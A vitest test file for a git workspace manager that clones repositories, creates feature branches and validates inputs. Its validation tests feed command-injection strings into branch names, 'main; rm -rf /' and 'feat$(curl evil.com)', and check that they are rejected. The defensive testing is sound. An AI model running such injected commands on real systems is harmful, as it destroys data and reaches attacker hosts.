// @ts-nocheck — test file, vitest uses esbuild transform
import { describe, it, expect, vi, beforeEach } from 'vitest';

vi.mock('node:child_process', () => ({
  execFileSync: vi.fn(),
}));

vi.mock('node:fs', () => ({
  existsSync: vi.fn(),
  mkdirSync: vi.fn(),
}));

vi.mock('node:crypto', () => ({
  randomBytes: vi.fn(() => Buffer.from('a1b2c3', 'hex')),
}));

vi.mock('../../config.js', () => ({
  config: {
    workspace: {
      baseDir: '/tmp/workspaces',
      branchPrefix: 'feat/claude-session',
    },
    claude: {
      defaultWorkDir: '/home/user/projects',
    },
    repoCache: {
      dir: '/repos/cache',
      maxAgeDays: 30,
      maxSizeGb: 50,
      fetchIntervalMin: 10,
    },
  },
}));

vi.mock('../../utils/logger.js', () => ({
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
}));

// Mock cache module
const mockEnsureBareCache = vi.fn(() => '/repos/cache/github.com/user/repo.git');
const mockSanitizeRepoUrl = vi.fn((url: string) => url);
vi.mock('../cache.js', () => ({
  ensureBareCache: (...args: unknown[]) => mockEnsureBareCache(...args),
  sanitizeRepoUrl: (...args: unknown[]) => mockSanitizeRepoUrl(...args),
}));

import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync } from 'node:fs';
import { deriveRepoName, setupWorkspace } from '../manager.js';

const mockExecFileSync = vi.mocked(execFileSync);
const mockExistsSync = vi.mocked(existsSync);
const mockMkdirSync = vi.mocked(mkdirSync);

beforeEach(() => {
  vi.clearAllMocks();
  // 默认: baseDir 存在, workspacePath 不存在
  mockExistsSync.mockImplementation((p) => {
    if (p === '/tmp/workspaces') return true;
    return false;
  });
  mockEnsureBareCache.mockReturnValue('/repos/cache/github.com/user/repo.git');
  mockSanitizeRepoUrl.mockImplementation((url) => url);
});

// ============================================================
// deriveRepoName
// ============================================================

describe('deriveRepoName', () => {
  it('should extract name from HTTPS URL', () => {
    expect(deriveRepoName('https://github.com/user/my-repo')).toBe('my-repo');
  });

  it('should strip .git suffix from HTTPS URL', () => {
    expect(deriveRepoName('https://github.com/user/my-repo.git')).toBe('my-repo');
  });

  it('should strip .git/ suffix', () => {
    expect(deriveRepoName('https://github.com/user/my-repo.git/')).toBe('my-repo');
  });

  it('should extract name from SSH URL', () => {
    expect(deriveRepoName('git@github.com:user/my-repo.git')).toBe('my-repo');
  });

  it('should extract name from local path', () => {
    expect(deriveRepoName('/home/user/projects/my-app')).toBe('my-app');
  });

  it('should strip trailing slashes from path', () => {
    expect(deriveRepoName('/home/user/projects/my-app///')).toBe('my-app');
  });

  it('should fallback to "repo" for empty basename', () => {
    expect(deriveRepoName('')).toBe('repo');
  });

  it('should handle URL with nested path', () => {
    expect(deriveRepoName('https://gitlab.com/group/subgroup/project.git')).toBe('project');
  });
});

// ============================================================
// setupWorkspace
// ============================================================

describe('setupWorkspace', () => {
  it('should throw when neither repoUrl nor localPath is provided', () => {
    expect(() => setupWorkspace({})).toThrow('必须提供 repo_url 或 local_path');
  });

  describe('writable mode (default)', () => {
    it('should use bare cache for remote repo and create feature branch', () => {
      const result = setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });

      expect(result.repoName).toBe('repo');
      expect(result.branch).toMatch(/^feat\/claude-session-/);

      // Should call ensureBareCache
      expect(mockEnsureBareCache).toHaveBeenCalledWith('https://github.com/user/repo.git');

      // Should call git clone (from cache) and git checkout -b
      expect(mockExecFileSync).toHaveBeenCalledTimes(3); // clone + set-url + checkout

      const cloneCall = mockExecFileSync.mock.calls[0];
      expect(cloneCall[0]).toBe('git');
      expect(cloneCall[1]).toContain('clone');
      // Clone source should be the cache path
      expect(cloneCall[1]).toContain('/repos/cache/github.com/user/repo.git');

      // set-url call
      const setUrlCall = mockExecFileSync.mock.calls[1];
      expect(setUrlCall[1]).toContain('set-url');

      // checkout call
      const checkoutCall = mockExecFileSync.mock.calls[2];
      expect(checkoutCall[1][0]).toBe('checkout');
      expect(checkoutCall[1][1]).toBe('-b');
    });

    it('should sanitize remote URL when setting origin', () => {
      mockSanitizeRepoUrl.mockReturnValue('https://github.com/user/repo.git');

      setupWorkspace({ repoUrl: 'https://token:x@github.com/user/repo.git' });

      expect(mockSanitizeRepoUrl).toHaveBeenCalledWith('https://token:x@github.com/user/repo.git');

      const setUrlCall = mockExecFileSync.mock.calls[1];
      expect(setUrlCall[1]).toContain('https://github.com/user/repo.git');
    });

    it('should use custom featureBranch when specified', () => {
      const result = setupWorkspace({
        repoUrl: 'https://github.com/user/repo',
        featureBranch: 'fix/my-bug',
      });

      expect(result.branch).toBe('fix/my-bug');
    });
  });

  describe('readonly mode', () => {
    it('should clone from cache without creating feature branch', () => {
      const result = setupWorkspace({
        repoUrl: 'https://github.com/user/repo.git',
        mode: 'readonly',
      });

      expect(result.repoName).toBe('repo');

      // Should use bare cache
      expect(mockEnsureBareCache).toHaveBeenCalled();

      // Should only call git clone (no set-url, no checkout -b)
      expect(mockExecFileSync).toHaveBeenCalledTimes(1);
      const cloneCall = mockExecFileSync.mock.calls[0];
      expect(cloneCall[1]).toContain('clone');
    });

    it('should checkout source_branch if specified', () => {
      setupWorkspace({
        repoUrl: 'https://github.com/user/repo.git',
        mode: 'readonly',
        sourceBranch: 'develop',
      });

      const cloneArgs = mockExecFileSync.mock.calls[0][1];
      expect(cloneArgs).toContain('--branch');
      expect(cloneArgs).toContain('develop');
    });

    it('should include "readonly" in workspace dir name', () => {
      const result = setupWorkspace({
        repoUrl: 'https://github.com/user/repo.git',
        mode: 'readonly',
      });

      expect(result.workspacePath).toContain('readonly');
    });
  });

  describe('localPath (no cache)', () => {
    it('should clone directly from localPath without using cache', () => {
      mockExistsSync.mockImplementation((p) => {
        if (p === '/tmp/workspaces') return true;
        if (p === '/home/user/projects/my-app') return true;
        if (p === '/home/user/projects') return true;
        return false;
      });

      const result = setupWorkspace({ localPath: '/home/user/projects/my-app' });

      expect(result.repoName).toBe('my-app');
      // Should NOT call ensureBareCache
      expect(mockEnsureBareCache).not.toHaveBeenCalled();

      // Clone source should be the local path
      const cloneArgs = mockExecFileSync.mock.calls[0][1];
      expect(cloneArgs).toContain('/home/user/projects/my-app');
    });
  });

  it('should include git security parameters in clone args (local clone from cache)', () => {
    setupWorkspace({ repoUrl: 'https://github.com/user/repo.git' });

    const cloneArgs = mockExecFileSync.mock.calls[0][1];
    // 从 bare cache 本地 clone 时使用 LOCAL 安全参数（不含 protocol.file.allow=never）
    expect(cloneArgs).toContain('--config');
    expect(cloneArgs[cloneArgs.indexOf('--config') + 1]).toBe('core.hooksPath=/dev/null');
    expect(cloneArgs).toContain('--no-recurse-submodules');
    // 本地 clone 不应禁用 file 协议
    expect(cloneArgs).not.toContain('protocol.file.allow=never');
  });

  it('should pass --branch when sourceBranch is specified', () => {
    setupWorkspace({ repoUrl: 'https://github.com/user/repo', sourceBranch: 'develop' });

    const cloneCall = mockExecFileSync.mock.calls[0];
    const args = cloneCall[1];
    const branchIdx = args.indexOf('--branch');
    expect(branchIdx).toBeGreaterThan(-1);
    expect(args[branchIdx + 1]).toBe('develop');
  });

  it('should create baseDir if it does not exist', () => {
    mockExistsSync.mockReturnValue(false);

    setupWorkspace({ repoUrl: 'https://github.com/user/repo' });

    expect(mockMkdirSync).toHaveBeenCalledWith('/tmp/workspaces', { recursive: true });
  });

  it('should wrap git clone errors', () => {
    mockExecFileSync.mockImplementationOnce(() => {
      throw new Error('fatal: repository not found');
    });

    expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/no-exist' }))
      .toThrow('git clone 失败: fatal: repository not found');
  });

  it('should wrap git checkout errors (writable mode)', () => {
    mockExecFileSync
      .mockImplementationOnce(() => '') // clone
      .mockImplementationOnce(() => '') // set-url
      .mockImplementationOnce(() => {   // checkout
        throw new Error('fatal: branch already exists');
      });

    expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/repo' }))
      .toThrow('创建分支失败: fatal: branch already exists');
  });

  // ============================================================
  // 输入校验
  // ============================================================

  describe('input validation', () => {
    it('should reject repoUrl without valid protocol', () => {
      expect(() => setupWorkspace({ repoUrl: 'not-a-url' }))
        .toThrow('无效的仓库 URL: not-a-url');
    });

    it('should accept HTTPS URL', () => {
      expect(() => setupWorkspace({ repoUrl: 'https://github.com/user/repo' }))
        .not.toThrow();
    });

    it('should accept SSH URL', () => {
      expect(() => setupWorkspace({ repoUrl: 'git@github.com:user/repo.git' }))
        .not.toThrow();
    });

    it('should accept ssh:// URL', () => {
      expect(() => setupWorkspace({ repoUrl: 'ssh://git@github.com/user/repo' }))
        .not.toThrow();
    });

    it('should accept git:// URL', () => {
      expect(() => setupWorkspace({ repoUrl: 'git://github.com/user/repo' }))
        .not.toThrow();
    });

    it('should reject localPath that does not exist', () => {
      mockExistsSync.mockImplementation((p) => {
        if (p === '/tmp/workspaces') return true;
        return false;
      });

      expect(() => setupWorkspace({ localPath: '/nonexistent/path' }))
        .toThrow('本地路径不存在: /nonexistent/path');
    });

    it('should reject sourceBranch with shell metacharacters', () => {
      expect(() => setupWorkspace({
        repoUrl: 'https://github.com/user/repo',
        sourceBranch: 'main; rm -rf /',
      })).toThrow('无效的分支名: main; rm -rf /');
    });

    it('should reject featureBranch with shell metacharacters', () => {
      expect(() => setupWorkspace({
        repoUrl: 'https://github.com/user/repo',
        featureBranch: 'feat$(curl evil.com)',
      })).toThrow('无效的分支名');
    });

    it('should accept valid branch names with slashes, dots, dashes', () => {
      expect(() => setupWorkspace({
        repoUrl: 'https://github.com/user/repo',
        sourceBranch: 'release/v1.2.3',
        featureBranch: 'feat/my-feature_v2',
      })).not.toThrow();
    });
  });
});
